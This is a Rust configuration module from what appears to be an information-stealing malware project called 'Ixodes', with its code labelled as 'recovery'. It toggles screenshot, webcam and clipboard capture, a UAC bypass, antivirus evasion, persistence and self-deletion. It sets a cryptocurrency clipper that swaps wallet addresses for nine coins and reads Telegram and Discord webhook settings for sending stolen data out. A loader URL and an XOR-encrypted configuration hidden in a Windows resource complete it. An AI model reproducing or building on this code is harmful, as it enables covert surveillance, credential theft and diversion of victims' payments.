use crate::recovery::config::LoaderConfig;
use crate::recovery::defaults::*;
use crate::recovery::task::RecoveryCategory;
use base64::{Engine as _, engine::general_purpose::STANDARD};
use once_cell::sync::Lazy;
use std::collections::HashSet;
use std::env;
use tracing::{info, warn};

static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::load);

#[derive(Debug)]
pub struct RecoveryControl {
    config: LoaderConfig,
}

impl RecoveryControl {
    pub fn global() -> &'static RecoveryControl {
        &GLOBAL_RECOVERY_CONTROL
    }

    fn load() -> Self {
        if let Some(config) = load_embedded_config() {
            info!("loaded embedded configuration from binary");
            return Self { config };
        }

        info!("no embedded configuration found, using environment/defaults");
        Self {
            config: Self::from_env(),
        }
    }

    pub fn artifact_key(&self) -> Option<Vec<u8>> {
        self.config
            .artifact_key
            .as_deref()
            .and_then(decode_artifact_key)
    }

    #[cfg(feature = "screenshot")]
    pub fn capture_screenshots(&self) -> bool {
        self.config.capture_screenshots.unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS)
    }

    #[cfg(feature = "webcam")]
    pub fn capture_webcams(&self) -> bool {
        self.config.capture_webcams.unwrap_or(DEFAULT_CAPTURE_WEBCAMS)
    }

    #[cfg(feature = "clipboard")]
    pub fn capture_clipboard(&self) -> bool {
        self.config.capture_clipboard.unwrap_or(DEFAULT_CAPTURE_CLIPBOARD)
    }

    #[cfg(feature = "uac")]
    pub fn uac_bypass_enabled(&self) -> bool {
        self.config.uac_bypass_enabled.unwrap_or(DEFAULT_UAC_BYPASS)
    }

    #[cfg(feature = "evasion")]
    pub fn evasion_enabled(&self) -> bool {
        self.config.evasion_enabled.unwrap_or(DEFAULT_EVASION_ENABLED)
    }

    #[cfg(feature = "clipper")]
    pub fn clipper_enabled(&self) -> bool {
        self.config.clipper_enabled.unwrap_or(DEFAULT_CLIPPER_ENABLED)
    }

    #[cfg(feature = "melt")]
    pub fn melt_enabled(&self) -> bool {
        self.config.melt_enabled.unwrap_or(DEFAULT_MELT_ENABLED) && !self.debug_enabled()
    }

    pub fn debug_enabled(&self) -> bool {
        self.config.debug_enabled.unwrap_or(DEFAULT_DEBUG_ENABLED)
    }

    #[allow(dead_code)]
    pub fn pump_size_mb(&self) -> u32 {
        self.config.pump_size_mb.unwrap_or(DEFAULT_PUMP_SIZE_MB)
    }

    #[cfg(feature = "clipper")]
    pub fn btc_address(&self) -> Option<&String> { self.config.btc_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn eth_address(&self) -> Option<&String> { self.config.eth_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn ltc_address(&self) -> Option<&String> { self.config.ltc_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn xmr_address(&self) -> Option<&String> { self.config.xmr_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn doge_address(&self) -> Option<&String> { self.config.doge_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn dash_address(&self) -> Option<&String> { self.config.dash_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn sol_address(&self) -> Option<&String> { self.config.sol_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn trx_address(&self) -> Option<&String> { self.config.trx_address.as_ref() }
    #[cfg(feature = "clipper")]
    pub fn ada_address(&self) -> Option<&String> { self.config.ada_address.as_ref() }

    pub fn telegram_token(&self) -> Option<&String> { self.config.telegram_token.as_ref() }
    pub fn telegram_chat_id(&self) -> Option<&String> { self.config.telegram_chat_id.as_ref() }
    pub fn discord_webhook(&self) -> Option<&String> { self.config.discord_webhook.as_ref() }
    pub fn loader_url(&self) -> Option<&String> { self.config.loader_url.as_ref() }
    pub fn proxy_server(&self) -> Option<&String> { self.config.proxy_server.as_ref() }

    #[cfg(feature = "persistence")]
    #[allow(dead_code)]
    pub fn persistence_enabled(&self) -> bool {
        self.config.persistence_enabled.unwrap_or(DEFAULT_PERSISTENCE)
    }

    pub fn blocked_countries(&self) -> Option<&HashSet<String>> { self.config.blocked_countries.as_ref() }
    pub fn custom_extensions(&self) -> Option<&HashSet<String>> { self.config.custom_extensions.as_ref() }
    pub fn custom_keywords(&self) -> Option<&HashSet<String>> { self.config.custom_keywords.as_ref() }
    pub fn archive_password(&self) -> Option<&String> { self.config.archive_password.as_ref() }

    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
        match &self.config.allowed_categories {
            Some(allowed) => allowed.contains(&category.to_string()),
            None => true,
        }
    }

    fn from_env() -> LoaderConfig {
        LoaderConfig {
            allowed_categories: env::var("IXODES_ENABLED_CATEGORIES").ok().map(|v| v.split(',').map(|s| s.trim().to_string()).collect()),
            artifact_key: env::var("IXODES_ARTIFACT_KEY").ok().or_else(|| DEFAULT_ARTIFACT_KEY.map(String::from)),
            capture_screenshots: parse_flag("IXODES_CAPTURE_SCREENSHOTS"),
            capture_webcams: parse_flag("IXODES_CAPTURE_WEBCAM"),
            capture_clipboard: parse_flag("IXODES_CAPTURE_CLIPBOARD"),
            persistence_enabled: parse_flag("IXODES_PERSISTENCE"),
            uac_bypass_enabled: parse_flag("IXODES_UAC_BYPASS"),
            evasion_enabled: parse_flag("IXODES_EVASION"),
            clipper_enabled: parse_flag("IXODES_CLIPPER"),
            melt_enabled: parse_flag("IXODES_MELT"),
            debug_enabled: parse_flag("IXODES_DEBUG"),
            #[cfg(feature = "clipper")]
            btc_address: env::var("IXODES_BTC_ADDRESS").ok().or_else(|| DEFAULT_BTC_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            eth_address: env::var("IXODES_ETH_ADDRESS").ok().or_else(|| DEFAULT_ETH_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            ltc_address: env::var("IXODES_LTC_ADDRESS").ok().or_else(|| DEFAULT_LTC_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            xmr_address: env::var("IXODES_XMR_ADDRESS").ok().or_else(|| DEFAULT_XMR_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            doge_address: env::var("IXODES_DOGE_ADDRESS").ok().or_else(|| DEFAULT_DOGE_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            dash_address: env::var("IXODES_DASH_ADDRESS").ok().or_else(|| DEFAULT_DASH_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            sol_address: env::var("IXODES_SOL_ADDRESS").ok().or_else(|| DEFAULT_SOL_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            trx_address: env::var("IXODES_TRX_ADDRESS").ok().or_else(|| DEFAULT_TRX_ADDRESS.map(String::from)),
            #[cfg(feature = "clipper")]
            ada_address: env::var("IXODES_ADA_ADDRESS").ok().or_else(|| DEFAULT_ADA_ADDRESS.map(String::from)),
            #[cfg(not(feature = "clipper"))]
            btc_address: None,
            #[cfg(not(feature = "clipper"))]
            eth_address: None,
            #[cfg(not(feature = "clipper"))]
            ltc_address: None,
            #[cfg(not(feature = "clipper"))]
            xmr_address: None,
            #[cfg(not(feature = "clipper"))]
            doge_address: None,
            #[cfg(not(feature = "clipper"))]
            dash_address: None,
            #[cfg(not(feature = "clipper"))]
            sol_address: None,
            #[cfg(not(feature = "clipper"))]
            trx_address: None,
            #[cfg(not(feature = "clipper"))]
            ada_address: None,
            telegram_token: env::var("IXODES_TELEGRAM_TOKEN").ok().or_else(|| DEFAULT_TELEGRAM_TOKEN.map(String::from)),
            telegram_chat_id: env::var("IXODES_CHAT_ID").ok().or_else(|| DEFAULT_TELEGRAM_CHAT_ID.map(String::from)),
            discord_webhook: env::var("IXODES_DISCORD_WEBHOOK").ok().or_else(|| DEFAULT_DISCORD_WEBHOOK.map(String::from)),
            loader_url: env::var("IXODES_LOADER_URL").ok().or_else(|| DEFAULT_LOADER_URL.map(String::from)),
            proxy_server: env::var("IXODES_PROXY_SERVER").ok().or_else(|| DEFAULT_PROXY_SERVER.map(String::from)),
            pump_size_mb: env::var("IXODES_PUMP_SIZE_MB").ok().and_then(|v| v.parse().ok()),
            blocked_countries: env::var("IXODES_BLOCKED_COUNTRIES").ok().map(|v| v.split(',').map(|s| s.trim().to_string()).collect()),
            custom_extensions: env::var("IXODES_CUSTOM_EXTENSIONS").ok().map(|v| v.split(',').map(|s| s.trim().to_string()).collect()),
            custom_keywords: env::var("IXODES_CUSTOM_KEYWORDS").ok().map(|v| v.split(',').map(|s| s.trim().to_string()).collect()),
            archive_password: env::var("IXODES_PASSWORD").ok().map(|v| v.trim().to_string()).filter(|v| !v.is_empty()),
        }
    }
}

fn load_embedded_config() -> Option<LoaderConfig> {
    load_resource_config()
}

#[cfg(not(target_os = "windows"))]
fn load_resource_config() -> Option<LoaderConfig> {
    None
}

#[cfg(target_os = "windows")]
fn load_resource_config() -> Option<LoaderConfig> {
    use windows_sys::Win32::System::LibraryLoader::{
        FindResourceW, LoadResource, LockResource, SizeofResource,
    };
    use crate::build_config::{RESOURCE_ID, RESOURCE_NAME};

    unsafe {
        let hrsrc = if let Some(id) = RESOURCE_ID {
            FindResourceW(std::ptr::null_mut(), id as *const u16, 10 as *const u16)
        } else if let Some(name) = RESOURCE_NAME {
            let resource_name: Vec<u16> = format!("{}\0", name).encode_utf16().collect();
            FindResourceW(std::ptr::null_mut(), resource_name.as_ptr(), 10 as *const u16)
        } else {
            return None;
        };
        
        if hrsrc.is_null() {
            return None;
        }

        let hglobal = LoadResource(std::ptr::null_mut(), hrsrc);
        if hglobal.is_null() {
            return None;
        }

        let size = SizeofResource(std::ptr::null_mut(), hrsrc);
        let data_ptr = LockResource(hglobal);

        if data_ptr.is_null() || size == 0 {
            return None;
        }

        let payload = std::slice::from_raw_parts(data_ptr as *const u8, size as usize);

        if payload.len() <= 32 {
            return None;
        }

        let (key, encrypted_data) = payload.split_at(32);
        let decrypted = xor_codec(encrypted_data, key);

        match serde_json::from_slice::<LoaderConfig>(&decrypted) {
            Ok(config) => Some(config),
            Err(e) => {
                warn!("failed to parse resource config: {}", e);
                None
            }
        }
    }
}

fn xor_codec(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut output = data.to_vec();
    if key.is_empty() {
        return output;
    }

    for (i, byte) in output.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    output
}

fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return None;
    }
    match STANDARD.decode(trimmed) {
        Ok(bytes) => {
            if bytes.len() != 32 {
                warn!("artifact encryption key must be 32 bytes (base64); got {} bytes", bytes.len());
                None
            } else {
                Some(bytes)
            }
        }
        Err(err) => {
            warn!(error = ?err, "failed to decode artifact encryption key");
            None
        }
    }
}

fn parse_flag(key: &str) -> Option<bool> {
    env::var(key).ok().map(|value| {
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    })
}

